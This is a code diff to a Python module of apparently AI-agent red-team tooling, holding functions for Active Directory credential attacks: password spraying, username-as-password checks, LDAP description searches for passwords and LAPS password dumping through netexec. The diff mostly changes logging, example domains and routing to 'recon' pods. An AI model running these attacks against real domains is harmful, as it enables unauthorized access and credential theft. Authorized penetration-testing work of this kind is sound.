@@ -7,12 +7,12 @@ This module provides tools for finding easy credential wins:
 - LAPS password retrieval
 """
 
-import logging
 import re
 from typing import Any, ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
+from loguru import logger
 
 from ares.core.models import Credential
 from ares.tools.red.common import (
@@ -27,8 +27,6 @@ from ares.tools.red.common import (
     run_tool,
     write_users_file_remote,
 )
-
-logger = logging.getLogger(__name__)
 
 
 class CredentialDiscoveryTools(Toolset):
@@ -255,7 +253,7 @@ class CredentialDiscoveryTools(Toolset):
 
         Args:
             target: Domain controller IP address
-            domain: Target domain (e.g., 'example.local')
+            domain: Target domain (e.g., 'contoso.local')
             username: Username for LDAP authentication
             password: Password for authentication
 
@@ -263,7 +261,7 @@ class CredentialDiscoveryTools(Toolset):
             Users with non-empty descriptions (check for passwords!)
 
         Example:
-            >>> ldap_search_descriptions("192.168.58.10", "example.local", "user", "pass")
+            >>> ldap_search_descriptions("192.168.58.10", "contoso.local", "user", "pass")
         """
         # Validate required credentials
         if not username or not username.strip():
@@ -370,8 +368,8 @@ class CredentialDiscoveryTools(Toolset):
             Successful authentications (look for valid credentials)
 
         Example:
-            >>> password_spray("192.168.58.10", "child.example.local", "Password1")  # auto-enumerate
-            >>> password_spray("192.168.58.10", "child.example.local", "Password1", "/tmp/users.txt")
+            >>> password_spray("192.168.58.10", "child.contoso.local", "Password1")  # auto-enumerate
+            >>> password_spray("192.168.58.10", "child.contoso.local", "Password1", "/tmp/users.txt")
         """
         try:
             if not users_file:
@@ -379,14 +377,14 @@ class CredentialDiscoveryTools(Toolset):
                 enumerated_file = self._enumerate_users_to_file(target)
                 if not enumerated_file:
                     canonical_users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
-                    # Check on recon pod since netexec commands route there
-                    exists, _ = remote_file_exists(canonical_users_file, target_role="recon")
+                    # Check if users file exists locally
+                    exists, _ = remote_file_exists(canonical_users_file, target_role=None)
                     if not exists:
                         return (
                             "[!] Failed to enumerate users and no users_file provided. "
                             "Try save_users_to_file first."
                         )
-                    logger.info(f"[*] Using existing users file on remote: {canonical_users_file}")
+                    logger.info(f"[*] Using existing users file: {canonical_users_file}")
                     users_file = canonical_users_file
                 else:
                     users_file = enumerated_file
@@ -402,9 +400,9 @@ class CredentialDiscoveryTools(Toolset):
                         continue
                     exclude_users.add(cred.username.lower())
                 if exclude_users:
-                    # Filter on recon pod since netexec commands route there
+                    # Filter out users who already have credentials
                     filtered_file, error = filter_users_file_remote(
-                        users_file, exclude_users, target_role="recon"
+                        users_file, exclude_users, target_role=None
                     )
                     if error == "all users already have credentials":
                         return "[!] Password spray skipped: all users already have credentials."
@@ -430,7 +428,8 @@ class CredentialDiscoveryTools(Toolset):
                 cmd.extend(["--jitter", str(delay_seconds)])
 
             logger.info(f"[*] Password spraying {domain} with password: {password}")
-            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300, target_role="recon")
 
             result = stdout + "\n" + (stderr or "")
             creds = self._parse_netexec_credentials(result)
@@ -507,8 +506,8 @@ class CredentialDiscoveryTools(Toolset):
                 return None
 
             users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
-            # Write to recon pod since netexec commands route there
-            ok, error = write_users_file_remote(sorted(users), users_file, target_role="recon")
+            # Write users file locally for password spraying
+            ok, error = write_users_file_remote(sorted(users), users_file, target_role=None)
             if not ok:
                 logger.warning(f"[!] Failed to write users file on remote: {error}")
                 return None
@@ -546,8 +545,8 @@ class CredentialDiscoveryTools(Toolset):
             Users with username=password combinations
 
         Example:
-            >>> username_as_password("192.168.58.10", "child.example.local")  # auto-enumerate
-            >>> username_as_password("192.168.58.10", "child.example.local", "/tmp/users.txt")
+            >>> username_as_password("192.168.58.10", "child.contoso.local")  # auto-enumerate
+            >>> username_as_password("192.168.58.10", "child.contoso.local", "/tmp/users.txt")
         """
         try:
             if not users_file:
@@ -555,14 +554,14 @@ class CredentialDiscoveryTools(Toolset):
                 enumerated_file = self._enumerate_users_to_file(target)
                 if not enumerated_file:
                     canonical_users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
-                    # Check on recon pod since netexec commands route there
-                    exists, _ = remote_file_exists(canonical_users_file, target_role="recon")
+                    # Check if users file exists locally
+                    exists, _ = remote_file_exists(canonical_users_file, target_role=None)
                     if not exists:
                         return (
                             "[!] Failed to enumerate users and no users_file provided. "
                             "Try save_users_to_file first."
                         )
-                    logger.info(f"[*] Using existing users file on remote: {canonical_users_file}")
+                    logger.info(f"[*] Using existing users file: {canonical_users_file}")
                     users_file = canonical_users_file
                 else:
                     users_file = enumerated_file
@@ -582,7 +581,8 @@ class CredentialDiscoveryTools(Toolset):
             ]
 
             logger.info(f"[*] Testing username=password combinations in {domain}")
-            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300, target_role="recon")
 
             result = stdout + "\n" + (stderr or "")
 
@@ -598,8 +598,7 @@ class CredentialDiscoveryTools(Toolset):
                     {f"{cred_domain}\\{username}" for cred_domain, username, _, _ in matching}
                 )
                 logger.warning(
-                    "[!] FOUND USER WITH USERNAME=PASSWORD! Accounts: %s",
-                    ", ".join(accounts),
+                    f"[!] FOUND USER WITH USERNAME=PASSWORD! Accounts: {', '.join(accounts)}"
                 )
                 result = (
                     "🚨 USERNAME=PASSWORD FOUND!\n"
@@ -667,7 +666,7 @@ class CredentialDiscoveryTools(Toolset):
             Password policy details from the domain controller
 
         Example:
-            >>> password_policy("192.168.58.10", "example.local", "user", "pass")
+            >>> password_policy("192.168.58.10", "contoso.local", "user", "pass")
         """
         cmd = [
             "netexec",
@@ -684,7 +683,8 @@ class CredentialDiscoveryTools(Toolset):
 
         try:
             logger.info(f"[*] Querying password policy for {domain}")
-            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120, target_role="recon")
             result = stdout + "\n" + (stderr or "")
 
             min_length = None
@@ -771,7 +771,7 @@ class CredentialDiscoveryTools(Toolset):
             LAPS passwords for computers where you have read access
 
         Example:
-            >>> laps_dump("192.168.58.10", "example.local", "user", "pass")
+            >>> laps_dump("192.168.58.10", "contoso.local", "user", "pass")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
@@ -793,7 +793,8 @@ class CredentialDiscoveryTools(Toolset):
 
         try:
             logger.info(f"[*] Dumping LAPS passwords from {domain}")
-            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120, target_role="recon")
 
             result = stdout + "\n" + (stderr or "")
 
